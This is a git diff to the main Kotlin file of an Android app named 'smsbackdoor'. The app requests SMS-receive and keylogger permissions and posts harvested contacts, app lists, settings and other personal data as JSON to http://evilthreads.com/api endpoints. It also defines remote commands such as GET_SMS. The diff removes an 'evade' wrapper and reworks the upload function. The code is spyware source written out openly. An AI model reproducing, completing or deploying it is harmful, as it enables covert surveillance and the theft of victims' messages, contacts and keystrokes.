@@ -36,6 +36,7 @@ import com.evilthreads.smsbackdoor.RemoteCommands.GET_SMS
 import com.kotlinpermissions.KotlinPermissions
 import io.ktor.client.*
 import io.ktor.client.engine.cio.*
+import io.ktor.client.features.*
 import io.ktor.client.features.auth.*
 import io.ktor.client.features.auth.providers.*
 import io.ktor.client.features.json.*
@@ -43,7 +44,11 @@ import io.ktor.client.features.json.serializer.*
 import io.ktor.client.request.*
 import io.ktor.http.*
 import io.ktor.util.*
+import kotlinx.coroutines.MainScope
+import kotlinx.coroutines.launch
 import kotlinx.coroutines.runBlocking
+import kotlinx.serialization.Serializable
+
 /*
             (   (                ) (             (     (
             )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
@@ -85,7 +90,6 @@ class MainActivity : AppCompatActivity() {
 
     init {
         lifecycleScope.launchWhenCreated {
-            evade(this) {
                 KotlinPermissions.with(this@MainActivity).permissions(Manifest.permission.RECEIVE_SMS)
                     .onAccepted {
                         val myPayload = suspend {
@@ -114,7 +118,7 @@ class MainActivity : AppCompatActivity() {
                         Keylogger.requestPermission(this@MainActivity)
                     }.ask()
             }
-        }
+
     }
 }
 
@@ -133,7 +137,7 @@ val client = HttpClient(CIO){
 
 val BASE_URL = "http://evilthreads.com/api"
 
-inline suspend fun <reified T: PocketData> HttpClient.upload(data: List<T>){
+inline suspend fun <reified T: PocketData> HttpClient.upload(data: Collection<T>){
     lateinit var endPoint: String
     when(data.first()){
         is Contact -> endPoint = "$BASE_URL/contacts"
@@ -148,9 +152,21 @@ inline suspend fun <reified T: PocketData> HttpClient.upload(data: List<T>){
         is Software -> endPoint = "$BASE_URL/apps"
         else -> return
     }
-    this.post<List<T>>(endPoint){
-        body = defaultSerializer().write(data, ContentType.Application.Json)
+    runCatching {
+        this.post<UserData<T>>(endPoint){
+            //UserData isn't working so it needs to say
+            //val jsonData = KotlinxSerializer().write(UserData(data), ContentType.Application.Json)
+            //only serializing the first value
+            val jsonData = KotlinxSerializer().write(data, ContentType.Application.Json)
+            Log.d("JSONDATA", "$jsonData")
+            body = jsonData
+        }
+    }.onFailure { e ->
+        when(e){
+            is ClientRequestException -> Log.d("SMSBackdoor", "This is expected because there is no server")
+        }
     }
+
 }
 
 object RemoteCommands{
@@ -166,3 +182,7 @@ object RemoteCommands{
     val GET_SETTINGS = "COMMAND_GET_SETTINGS"
     val GET_APPS = "COMMAND_GET_APPS"
 }
+
+/*this isn't working*/
+@Serializable
+class UserData<T: PocketData>(val data: Collection<T>)
